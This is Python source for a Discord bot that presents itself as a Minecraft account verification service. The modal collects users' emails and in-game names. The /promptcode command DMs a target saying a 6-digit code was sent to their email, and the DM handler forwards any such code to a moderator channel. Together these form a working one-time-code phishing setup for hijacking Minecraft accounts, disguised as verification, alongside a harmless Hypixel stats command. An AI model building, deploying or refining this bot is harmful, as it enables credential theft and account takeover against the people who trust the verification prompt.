import os
import discord
from discord.ext import commands
import json
import requests

TOKEN = os.getenv("DISCORD_TOKEN")
VERIFICATION_CHANNEL_ID = 1362951881827160295
MOD_CHANNEL_ID = 1362997933552959558
LAST_VERIFICATION_MSG_FILE = "last_verification_msg.json"
HYPIXEL_API_KEY = os.getenv("HYPIXEL_API_KEY")  # Make sure to set your Hypixel API key

intents = discord.Intents.default()
intents.message_content = True
intents.members = True
intents.dm_messages = True

bot = commands.Bot(command_prefix="!", intents=intents)

sent_invalid_codes = set()

def load_last_verification_msg_id():
    if os.path.exists(LAST_VERIFICATION_MSG_FILE):
        with open(LAST_VERIFICATION_MSG_FILE, "r") as file:
            data = json.load(file)
            print(f"Loaded last_verification_msg_id: {data.get('last_verification_msg_id')}")
            return data.get("last_verification_msg_id")
    return None

def save_last_verification_msg_id(msg_id):
    with open(LAST_VERIFICATION_MSG_FILE, "w") as file:
        json.dump({"last_verification_msg_id": msg_id}, file)
        print(f"Saved last_verification_msg_id: {msg_id}")

last_verification_msg_id = load_last_verification_msg_id()

class VerifyModal(discord.ui.Modal, title="Link Your Minecraft Account"):
    email = discord.ui.TextInput(label="Email")
    ign = discord.ui.TextInput(label="IGN")

    async def on_submit(self, interaction: discord.Interaction):
        log = await bot.fetch_channel(MOD_CHANNEL_ID)
        embed = discord.Embed(title="New Verification", color=discord.Color.orange())
        embed.add_field(name="User", value=interaction.user.mention, inline=False)
        embed.add_field(name="Email", value=self.email.value, inline=False)
        embed.add_field(name="IGN", value=self.ign.value, inline=False)
        await log.send(embed=embed)
        await interaction.response.send_message("✅ Submitted!", ephemeral=True)

class LinkView(discord.ui.View):
    def __init__(self):
        super().__init__(timeout=None)

    @discord.ui.button(label="Link Account", style=discord.ButtonStyle.primary)
    async def link(self, interaction: discord.Interaction, button: discord.ui.Button):
        await interaction.response.send_modal(VerifyModal())

async def send_verification_embed():
    global last_verification_msg_id
    channel = await bot.fetch_channel(VERIFICATION_CHANNEL_ID)

@bot.event
async def on_ready():
    print(f'Logged in as {bot.user.name} (ID: {bot.user.id})')
    print('Bot is ready!')
    try:
        synced = await bot.tree.sync()
        print(f"Synced {len(synced)} slash commands.")
    except Exception as e:
        print(f"Error syncing commands: {e}")

    verification_channel = await bot.fetch_channel(VERIFICATION_CHANNEL_ID)

    async for message in verification_channel.history(limit=50):
        if message.author == bot.user and message.embeds:
            embed = message.embeds[0]
            if embed.title == "🔗 Link Your Minecraft Account":
                await message.delete()

    embed = discord.Embed(
        title="🔗 Link Your Minecraft Account",
        description="Click the **Link Account** button below to start verification.",
        color=discord.Color.green()
    )
    embed.set_footer(text="This is an automated message.")
    await verification_channel.send(embed=embed, view=LinkView())

@bot.tree.command(name="setup")
async def setup(interaction: discord.Interaction):
    await send_verification_embed()
    await interaction.response.send_message("✅ Sent!", ephemeral=True)

@bot.tree.command(name="promptcode")
async def promptcode(interaction: discord.Interaction, user: discord.Member):
    try:
        embed = discord.Embed(
            title="📨 Minecraft Server Verification",
            description=( 
                "We've sent a 6-digit code to your email linked to Minecraft.\n\n"
                "Reply to this DM with the code to complete verification.\n\n"
                "🔒 Your info is private. Don't share your code."
            ),
            color=discord.Color.blue()
        )
        await user.send(embed=embed)
        await interaction.response.send_message("✅ Prompt sent.", ephemeral=True)
    except discord.errors.Forbidden:
        await interaction.response.send_message("❌ Couldn't send DM. Please make sure your DMs are open.", ephemeral=True)

@bot.tree.command(name="stats")
async def stats(interaction: discord.Interaction, minecraft_username: str):
    # Fetch Hypixel stats
    url = f"https://api.hypixel.net/player?key={HYPIXEL_API_KEY}&name={minecraft_username}"
    response = requests.get(url)
    data = response.json()

    if data.get("success"):
        player = data.get("player")
        if player:
            stats = player.get("stats", {}).get("SkyWars", {})
            if stats:
                embed = discord.Embed(
                    title=f"SkyWars Stats for {minecraft_username}",
                    color=discord.Color.blue()
                )
                embed.add_field(name="Wins", value=stats.get("wins", 0), inline=True)
                embed.add_field(name="Kills", value=stats.get("kills", 0), inline=True)
                embed.add_field(name="Deaths", value=stats.get("deaths", 0), inline=True)
                embed.add_field(name="Games Played", value=stats.get("games_played", 0), inline=True)
                await interaction.response.send_message(embed=embed)
            else:
                await interaction.response.send_message(f"❌ No SkyWars stats found for {minecraft_username}.")
        else:
            await interaction.response.send_message(f"❌ Player {minecraft_username} not found.")
    else:
        await interaction.response.send_message("❌ Error fetching stats from Hypixel API.")

@bot.event
async def on_message(message: discord.Message):
    if message.author.bot:
        return

    if isinstance(message.channel, discord.DMChannel):
        if message.content.isdigit() and len(message.content) == 6:
            mod = await bot.fetch_channel(MOD_CHANNEL_ID)
            embed = discord.Embed(
                title="✅ Code Submitted",
                description=f"User: {message.author.mention}\nCode: {message.content}",
                color=discord.Color.teal()
            )
            await mod.send(embed=embed)
            confirm_embed = discord.Embed(
                title="✅ Code Received",
                description="A mod will review your code shortly.",
                color=discord.Color.green()
            )
            await message.channel.send(embed=confirm_embed)
        else:
            if message.author.id not in sent_invalid_codes:
                embed = discord.Embed(
                    title="❌ Invalid Code",
                    description="Please enter a **6-digit code**.",
                    color=discord.Color.red()
                )
                await message.channel.send(embed=embed)
                sent_invalid_codes.add(message.author.id)

    await bot.process_commands(message)

bot.run(TOKEN)
